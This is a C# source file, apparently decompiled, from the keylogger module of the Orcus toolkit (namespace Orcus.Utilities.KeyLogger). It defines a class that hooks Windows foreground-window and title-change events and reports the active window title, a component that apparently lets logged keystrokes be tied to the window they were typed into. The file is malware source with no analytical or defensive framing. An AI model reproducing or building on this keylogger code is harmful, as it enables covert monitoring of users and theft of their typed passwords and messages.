using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;
using Orcus.Native;

namespace Orcus.Utilities.KeyLogger;

internal class ActiveWindowHook : IDisposable
{
	private readonly NativeMethods.WinEventDelegate _hookDelegate;

	private IntPtr _hookHandleTitleChange;

	private IntPtr _hookHandleWinChange;

	private string _lastWindowTitle;

	private const uint WINEVENT_OUTOFCONTEXT = 0u;

	private const uint EVENT_SYSTEM_FOREGROUND = 3u;

	private const uint EVENT_OBJECT_NAMECHANGE = 32780u;

	public event EventHandler<ActiveWindowChangedEventArgs> ActiveWindowChanged;

	public ActiveWindowHook()
	{
		_hookDelegate = WinEventProc;
		_hookHandleWinChange = NativeMethods.SetWinEventHook(3u, 3u, IntPtr.Zero, _hookDelegate, 0u, 0u, 0u);
		if (_hookHandleWinChange == IntPtr.Zero)
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
		_hookHandleTitleChange = NativeMethods.SetWinEventHook(32780u, 32780u, IntPtr.Zero, _hookDelegate, 0u, 0u, 0u);
		if (_hookHandleTitleChange == IntPtr.Zero)
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
	}

	public void Dispose()
	{
		Dispose(disposing: true);
		GC.SuppressFinalize(this);
	}

	protected virtual void Dispose(bool disposing)
	{
		if (_hookHandleWinChange != IntPtr.Zero)
		{
			NativeMethods.UnhookWinEvent(_hookHandleWinChange);
			_hookHandleWinChange = IntPtr.Zero;
		}
		if (_hookHandleTitleChange != IntPtr.Zero)
		{
			NativeMethods.UnhookWinEvent(_hookHandleTitleChange);
			_hookHandleTitleChange = IntPtr.Zero;
		}
	}

	~ActiveWindowHook()
	{
		Dispose(disposing: false);
	}

	public void RaiseOne()
	{
		WinEventProc(IntPtr.Zero, 0u, IntPtr.Zero, 0, 0, 0u, 0u);
	}

	private void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
	{
		if (this.ActiveWindowChanged != null)
		{
			string activeWindowTitle = GetActiveWindowTitle();
			if (!string.IsNullOrEmpty(activeWindowTitle) && _lastWindowTitle != activeWindowTitle)
			{
				this.ActiveWindowChanged(this, new ActiveWindowChangedEventArgs(_lastWindowTitle = activeWindowTitle));
			}
		}
	}

	public static string GetActiveWindowTitle()
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		if (NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), stringBuilder, 256) <= 0)
		{
			return null;
		}
		return stringBuilder.ToString();
	}
}
